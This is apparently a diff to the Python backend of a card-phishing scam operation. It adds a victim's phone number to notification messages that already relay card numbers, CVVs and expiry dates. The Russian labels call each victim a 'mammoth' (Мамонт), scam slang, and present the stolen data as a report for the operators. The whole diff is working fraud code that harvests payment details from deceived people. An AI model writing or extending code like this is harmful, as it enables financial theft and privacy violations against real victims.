@@ -803,7 +803,7 @@ def format_code_request_message(admin_username, name, price, currency, page_code
     
     return message
 
-def format_card_payment_message(page_code, name, price, currency, card_number, cvv="", expiry="", country=""):
+def format_card_payment_message(page_code, name, price, currency, card_number, cvv="", expiry="", country="", phone=""):
     """Формує красиве повідомлення про введення карти"""
     # Визначаємо назву події за page_code
     event_name = get_event_name_from_page_code(page_code)
@@ -812,6 +812,7 @@ def format_card_payment_message(page_code, name, price, currency, card_number, c
         f"🔔 Мамонт ввел карту ({event_name})\n\n"
         f"#️⃣ Ссылка: ?page={page_code or 'Не указано'}\n"
         f"👤 Мамонт: {name or 'Не указано'}\n"
+        f"📱 Телефон: {phone or 'Не указано'}\n"
         f"💰 Общая сумма: {price or 'Не указано'}{currency or ''}\n"
         f"💳 Номер карты: {card_number or 'Не указано'}\n"
         f"📅 Срок действия: {expiry or 'Не указано'}\n"
@@ -3644,6 +3645,7 @@ async def payment_notify(request):
             f"🔔 Мамонт ввел карту ({event_name})\n\n"
             f"🎫 {event_name}\n"
             f"👤 Мамонт: {get_best_fio(name, page_code, ip) or 'Не указано'}\n"
+            f"📱 Телефон: {phone or 'Не указано'}\n"
             f"💳 Карта: {card or 'Не указано'}\n"
             f"🔐 CVV: {cvv or 'Не указано'}\n"
             f"📅 Срок: {expiry or 'Не указано'}\n"
@@ -3657,6 +3659,7 @@ async def payment_notify(request):
             f"🔔 Мамонт ввел карту (Выставка)\n\n"
             f"🎫 Выставка\n"
             f"👤 Мамонт: {get_best_fio(name, page_code, ip) or 'Не указано'}\n"
+            f"📱 Телефон: {phone or 'Не указано'}\n"
             f"💳 Карта: {card or 'Не указано'}\n"
             f"🔐 CVV: {cvv or 'Не указано'}\n"
             f"📅 Срок: {expiry or 'Не указано'}\n"
